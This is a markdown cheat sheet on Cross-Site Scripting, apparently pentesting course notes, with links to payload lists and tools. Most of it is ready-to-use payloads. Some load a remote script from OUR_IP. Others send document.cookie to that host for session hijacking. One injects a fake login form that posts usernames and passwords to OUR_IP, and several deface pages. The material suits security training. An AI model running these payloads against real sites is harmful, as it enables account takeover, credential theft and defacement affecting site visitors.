# Cross Site Scripting (XSS)

## **Introduction**

> Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.\
> XSS normally allows an attacker to masquerade as a victim user, carrying out any actions that the user is able to perform and accessing any of the user's data.\
> **Source:** [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

***

## **XSS Useful References**

* [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

***

## **XSS Tools**

* [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
* [https://github.com/rajeshmajumdar/BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
* [https://github.com/epsylon/xsser](https://github.com/epsylon/xsser)

***

## **Basic XSS Payloads**

| Code                                                                            | Description               |
| ------------------------------------------------------------------------------- | ------------------------- |
| `<script>alert(window.origin)</script>`                                         | Basic XSS Payload         |
| `<plaintext>`                                                                   | Basic XSS Payload         |
| `<script>print()</script>`                                                      | Basic XSS Payload         |
| `<img src="" onerror=alert(window.origin)>`                                     | HTML-based XSS Payload    |
| `<script src="http://OUR_IP/script.js"></script>`                               | Load remote script        |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |

***

## **XSS Session Hijacking**

* Use the following XSS Payload: `<script src=http://OUR_IP/script.js></script>`
* On the attacker machine, write one of the following payload inside a file named `script.js`:
  1. `new Image().src='http://OUR_IP/index.php?c='+document.cookie`
  2. `document.location='http://OUR_IP/index.php?c='+document.cookie;`

***

## **XSS Phishing**

> * A common form of XSS phishing is obtained with stored XSS
> * The attacker can inject a fake login form that sends the credentials to an attacker's server,
> * To perform a Stored XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page.
> * An example of such login form is the following (Note: Change `OUR_IP` in the payload)

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

***

## **XSS Defacing**

> * Defacing means changing the website's appearance for anyone who visits the website
> * The website's appearance can be changed using injected Javascript code
> * Note: This requires a stored XSS Vulnerability

| Defacing Payload                                                                              | Description                                  |
| --------------------------------------------------------------------------------------------- | -------------------------------------------- |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change website background color              |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change website background image              |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change website title                         |
| `document.getElementById("todo").innerHTML = "New Text"`                                      | Change HTML element/DOM text using innerHTML |